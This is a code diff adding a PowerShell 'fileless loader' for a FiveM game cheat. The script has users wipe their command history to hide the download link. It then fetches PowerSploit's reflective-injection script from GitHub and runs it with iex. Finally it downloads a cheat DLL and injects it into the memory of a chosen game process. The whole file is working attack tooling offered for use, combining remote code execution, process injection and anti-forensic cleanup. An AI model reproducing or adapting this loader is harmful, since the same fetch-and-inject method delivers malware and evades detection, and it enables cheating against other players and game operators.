@@ -1,0 +1,92 @@
+# =========================================================================
+# PREMIUM 2SQUAD - FILELESS LOADER (PowerShell)
+# =========================================================================
+$ErrorActionPreference = "SilentlyContinue"
+$host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
+Clear-Host
+
+# ==========================================
+# 1. PREMIUM UI
+# ==========================================
+Write-Host ""
+Write-Host "        ___  ___  ___  _  __ __  _____  __  __ __ " -ForegroundColor Cyan
+Write-Host "       / _ \/ _ \/ __// |/ // / / /   |/ / / // / " -ForegroundColor Cyan
+Write-Host "      / ___/ , _/ _/ /    // /_/ / /| / /_/ // /_ " -ForegroundColor Cyan
+Write-Host "     /_/  /_/|_/___//_/|_/ \____/_/ |_/____//___/ " -ForegroundColor Cyan
+Write-Host "  ========================================================" -ForegroundColor DarkGray
+Write-Host "          P R E M I U M   2 S Q U A D   L O A D E R" -ForegroundColor White
+Write-Host "  ========================================================" -ForegroundColor DarkGray
+Write-Host ""
+
+# ==========================================
+# 2. HISTORY CLEANUP (บังคับลบประวัติ)
+# ==========================================
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Fetching PowerShell history..." -ForegroundColor White
+
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) {
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "!" -ForegroundColor Red -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Notepad opened. Please clear your link, SAVE, and CLOSE Notepad." -ForegroundColor Red
+    
+    # เปิด Notepad และหยุดรอจนกว่าจะกดปิดหน้าต่าง Notepad
+    Start-Process notepad.exe -ArgumentList $historyPath -Wait 
+    
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History cleaned securely." -ForegroundColor Green
+} else {
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "-" -ForegroundColor DarkGray -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " No history file found. Skipping..." -ForegroundColor DarkGray
+}
+Write-Host ""
+
+# ==========================================
+# 3. GET TARGET PID
+# ==========================================
+Write-Host "  " -NoNewline; Write-Host ">" -ForegroundColor Cyan -NoNewline; Write-Host " Enter Target PID (FiveM): " -ForegroundColor White -NoNewline
+$TargetPID = Read-Host
+
+if ([string]::IsNullOrWhiteSpace($TargetPID) -or -not ($TargetPID -match "^\d+$")) {
+    Write-Host "`n  [!] Invalid PID format. Exiting..." -ForegroundColor Red
+    Start-Sleep -Seconds 3
+    exit
+}
+
+$processExists = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
+if (-not $processExists) {
+    Write-Host "`n  [!] Process ID $TargetPID is not running! Exiting..." -ForegroundColor Red
+    Start-Sleep -Seconds 3
+    exit
+}
+
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Target Locked: $($processExists.ProcessName).exe (PID: $TargetPID)" -ForegroundColor Green
+Write-Host ""
+
+# ==========================================
+# 4. DOWNLOAD & INJECT (FILELESS)
+# ==========================================
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Downloading secure payload..." -ForegroundColor White
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+try {
+    # 4.1 ดึงสคริปต์ Reflective Injection จาก PowerSploit
+    $InjectorURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
+    iex (New-Object Net.WebClient).DownloadString($InjectorURL)
+
+    # 4.2 ⚠️ ใส่ลิ้งก์ Raw ของไฟล์ .dll ของคุณบน GitHub ตรงนี้ ⚠️
+    $DllURL = "https://raw.githubusercontent.com/ชื่อคุณ/ชื่อRepo/main/Premium2Squad.dll"
+    
+    $DllBytes = (New-Object Net.WebClient).DownloadData($DllURL)
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready ($($DllBytes.Length) bytes)." -ForegroundColor Green
+    
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Injecting into memory..." -ForegroundColor White
+    
+    # 4.3 ฉีด DLL เข้าหน่วยความจำเกม
+    Invoke-ReflectivePEInjection -PEBytes $DllBytes -ProcessId $TargetPID -ForceASLR
+    
+    Write-Host "`n  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Injection Successful! The cheat is now active." -ForegroundColor Cyan
+    Write-Host "  Closing loader in 5 seconds..." -ForegroundColor DarkGray
+
+} catch {
+    Write-Host "`n  [!] Injection Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "  [!] Make sure you are running PowerShell as Administrator and the DLL is valid." -ForegroundColor Red
+}
+
+Start-Sleep -Seconds 5
